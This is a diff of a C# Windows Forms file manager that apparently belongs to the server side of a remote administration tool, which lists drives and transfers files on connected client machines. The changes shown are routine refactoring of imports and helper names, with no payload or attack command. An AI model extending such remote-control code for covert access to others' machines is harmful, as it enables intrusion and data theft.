@@ -5,12 +5,12 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using xServer.Controls;
 using xServer.Core.Commands;
-using xServer.Core.Extensions;
 using xServer.Core.Helper;
-using xServer.Core.Misc;
 using xServer.Core.Networking;
-using PathType = xServer.Core.Commands.CommandHandler.PathType;
+using xServer.Core.Utilities;
+using xServer.Enums;
 
 namespace xServer.Forms
 {
@@ -29,11 +29,6 @@ namespace xServer.Forms
 
             _lvwColumnSorter = new ListViewColumnSorter();
             lstDirectory.ListViewItemSorter = _lvwColumnSorter;
-
-            lstDirectory.RemoveDots();
-            lstDirectory.ChangeTheme();
-            lstTransfers.RemoveDots();
-            lstTransfers.ChangeTheme();
         }
 
         private string GetAbsolutePath(string item)
@@ -45,7 +40,7 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = Helper.GetWindowTitle("File Manager", _connectClient);
+                this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
                 new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
             }
         }
@@ -105,7 +100,7 @@ namespace xServer.Forms
                 {
                     string path = GetAbsolutePath(files.SubItems[0].Text);
 
-                    int id = Helper.GetNewTransferId(files.Index);
+                    int id = FileHelper.GetNewTransferId(files.Index);
 
                     if (_connectClient != null)
                     {
@@ -301,7 +296,7 @@ namespace xServer.Forms
                     string path = filePath;
                     new Thread(() =>
                     {
-                        int id = Helper.GetNewTransferId();
+                        int id = FileHelper.GetNewTransferId();
 
                         if (string.IsNullOrEmpty(path)) return;
 
